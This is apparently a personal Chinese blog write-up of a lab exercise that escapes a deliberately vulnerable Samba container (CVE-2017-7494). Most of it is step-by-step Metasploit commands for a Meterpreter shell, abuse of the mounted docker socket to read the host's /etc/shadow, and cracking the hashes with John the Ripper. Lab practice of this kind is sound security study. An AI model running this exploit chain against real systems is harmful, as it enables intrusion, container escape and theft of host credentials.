有一段时间没做黑客攻防的实践了，本周换换口味，  

在网上看到一个从容器攻击宿主机的实践，本周末也照着试试，效果不错，

创建靶机，

docker run --rm -it \\  
       --name vulnerable \\  
       --network host \\  
       -v '/var/run/docker.sock:/var/run/docker.sock' \\  
       vulnerables/cve-2017-7494，

![](../Images/981595c1ccb0cbcbccf66a6eea36a48c.png)

创建攻击机，

docker run --rm -it \\  
       --network host \\  
       -v '/usr/bin/docker:/docker:ro' \\  
       strm/metasploit，

![](../Images/bd1cbbfcd4bad819040d289e6881e205.png)

先用攻击机做个扫描，

use auxiliary/scanner/smb/smb\_enumshares，

set RHOSTS 10.90.3.6，

exploit，

![](../Images/e575ebaedef5eda23aec71caeae9b9d2.png)

接下来就可以攻击获取meterpreter shell了，

use exploit/linux/samba/is\_known\_pipename，

set RHOST 10.90.3.6，

set RPORT 445，

set TARGET 3，

set SMB\_FOLDER data，

set SMBUser sambacry，

set SMBPass nosambanocry，

set payload linux/x64/meterpreter/bind\_tcp，

exploit，

![](../Images/ede401693abf754d33c44a21fcdac417.png)

上传文件，创造docker命令执行条件，

upload /docker /docker，

upload /usr/lib/x86\_64-linux-gnu/libltdl.so.7 /usr/lib/x86\_64-linux-gnu/libltdl.so.7，

chmod 777 /docker，

执行命令获取宿主机的密码文件，

execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow"，

![](../Images/fbbaeb364a1692e18ae1bf0d49d281db.png)

网上的实践就到这里，咱把最后一步给完成，

用John the Ripper破解，

把dump出来的密码文件内容放到本地文件里，vim shadow，

破解，john --show shadow，

![](../Images/5103759f827eb6848b4e722f2de31b98.png)

密码明文就出来了。
